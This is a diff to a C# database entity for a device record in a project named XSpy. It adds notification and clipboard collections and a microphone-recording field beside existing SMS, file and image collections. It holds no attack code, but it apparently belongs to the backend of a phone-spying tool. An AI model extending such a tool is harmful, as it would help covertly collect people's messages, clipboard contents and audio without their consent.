@@ -26,8 +26,10 @@ namespace XSpy.Database.Entities.Devices
         private ICollection<File> _savedFiles;
         private ICollection<FileList> _imageList;
         private ICollection<Sms> _messages;
+        private ICollection<Notification> _notifications;
         private ICollection<Permission> _permissions;
         private ICollection<TempPath> _tempPaths;
+        private ICollection<Clipboard> _clipboards;
         [Key, Column("id")] public Guid Id { get; set; }
 
         [Column("user_id"), ForeignKey(nameof(UserData))]
@@ -43,6 +45,7 @@ namespace XSpy.Database.Entities.Devices
         [Column("last_ip"), MaxLength(45)] public string LastIp { get; set; }
         [Column("is_online")] public bool IsOnline { get; set; }
         [Column("is_loading_dir")] public bool IsLoadingDir { get; set; }
+        [Column("recording_mic_block")] public DateTime? RecordingMicBlock { get; set; }
 
         [Column("added_at")] public DateTime AddedAt { get; set; }
         [Column("updated_at")] public DateTime UpdatedAt { get; set; }
@@ -97,16 +100,27 @@ namespace XSpy.Database.Entities.Devices
             get => LazyLoader.Load(this, ref _messages);
             set => _messages = value;
         }
+        public ICollection<Notification> Notifications
+        {
+            get => LazyLoader.Load(this, ref _notifications);
+            set => _notifications = value;
+        }
 
         public ICollection<Permission> Permissions
         {
             get => LazyLoader.Load(this, ref _permissions);
             set => _permissions = value;
         }
+        
         public ICollection<TempPath> TempPaths
         {
             get => LazyLoader.Load(this, ref _tempPaths);
             set => _tempPaths = value;
+        }
+        public ICollection<Clipboard> Clipboards
+        {
+            get => LazyLoader.Load(this, ref _clipboards);
+            set => _clipboards = value;
         }
     }
 }
